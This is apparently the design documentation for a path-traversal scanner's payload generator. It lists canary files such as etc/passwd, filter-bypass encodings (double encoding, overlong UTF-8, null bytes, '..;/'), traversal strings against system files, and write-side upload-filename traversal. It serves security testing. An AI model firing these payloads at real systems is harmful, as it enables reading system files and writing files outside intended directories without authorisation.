# Payloads

`probe/payloads.py`. Two generators: `generate()` for read-side traversal,
`generate_write()` for upload-filename (write-side) traversal.

## Canaries

A canary is a well-known file plus a regex that proves its content is present.

| `--canary` | target(s) | proof regex |
|------------|-----------|-------------|
| `unix` (default) | `etc/passwd` (+ `etc/hostname` with `--thorough`) | `root:.*?:0:0:` |
| `windows` | `windows/win.ini` | `\[fonts\]` / `\[extensions\]` / `for 16-bit app support` |
| `both` | both families | either |

Without `--thorough`, only the first target of each family is used.

Weak (non-confirming) signal regex `FS_ERROR`: `no such file or directory`,
`failed to open stream`, `permission denied`, `not a directory`,
`FileNotFoundError`, `IsADirectoryError`, `Traceback (most recent call last)`,
`java.io.FileNotFound`, `System.IO.(File|Directory)NotFound`.

## `generate(canary, depth_min=1, depth_max=6, depth_step=1, thorough=False, ext="")`

### Absolute payloads (depth 0)

`/etc/passwd` · `%2fetc/passwd` · `//etc/passwd` · `/./etc/passwd`

### Encoding families × depth ladder

Each family is emitted for every depth `1..depth_max` as `<sep>×depth + target`
(the target's slashes are encoded to match, for `slash-enc` / `dot-slash-enc` /
`overlong-utf8` / `backslash-enc`):

| label | separator | bypasses |
|-------|-----------|----------|
| `raw` | `../` | nothing (baseline); **not** used for `url-path-segment` (httpx collapses it) |
| `slash-enc` | `..%2f` | literal-`../` filters |
| `dot-slash-enc` | `%2e%2e%2f` | `..` and `../` filters |
| `dot-enc` | `%2e%2e/` | `..`/`../` filters, keeps a literal slash |
| `double-enc` | `%252e%252e%252f` | single-decode-then-check filters |
| `quad-dot` | `....//` | filters that strip one `../` and re-join |
| `semicolon` | `..;/` | path-parameter splitting (Tomcat, Rails) |
| `backslash-enc` | `..%5c` | `/`-only filters on Windows |
| `overlong-utf8` | `%c0%ae%c0%ae%c0%af` | ASCII-only filters (legacy IIS decoders) |

### Tail variants (per depth)

- `leading-slash:d<n>` — `/` + `../`×n + target
- `nullbyte:d<n>` — `../`×n + target + `%00` (truncation before an appended suffix)
- `nullbyte-ext:d<n>` / `nullbyte-ext-enc:d<n>` — only when the baseline value had
  an extension `ext`: the traversal + `%00.<ext>`

### Ordering and cap

**Encoding-major, depth-minor**: absolutes, then all `raw` depths, then all
`slash-enc` depths, and so on. The first *N* payloads therefore sample every
encoding across the whole depth range. After generation the set is filtered to
payloads whose `kinds` include the vector's `location`, then truncated to
`--max-payloads` (default 90). Read sets are cached per `(canary, ext)` in a run.

Each `Payload` carries: `name` (label + `:d<n>`), `value`, `canary_key`,
`canary_re`, `depth`, `note`, `kinds`.

## `generate_write(marker, content, depth_min=1, depth_max=6)`

For `multipart` vectors only. **Safe by construction** — climb-only, never
absolute, never a system path.

- `marker` = `ept-wr-<hex>.txt`, `content` = `EPT-ROUNDTRIP-<hex>`
- payloads: `<sep>×depth + marker` for `sep` ∈ `../`, `..%2f`, `%2e%2e%2f`,
  `....//`, `..\`; depths `1..min(depth_max, 8)`
- `kinds = ("multipart",)`, `canary_re` = the marker

Worst case if the sink is vulnerable: a benign file is written one or more
directories above the intended upload dir. Stage 2 step 7 then tries to `GET` the
`marker` back; recovering the unique `content` upgrades the finding to
`confirmed`.

## Injection reminders (see stage-2.md step 3)

- **query**: URL built as a string, values quoted `safe="/%"` → `../` and `%2e…`
  survive verbatim; `params=` is never used.
- **url-path-segment**: encoded separators only (httpx normalises `../` in a
  path). `raw` is excluded from this location.
- **json-body / form / cookie / header**: the value is sent literally, so raw
  `../../../etc/passwd` is the cleanest probe there.
- **multipart**: the payload is the *filename* of the file part.
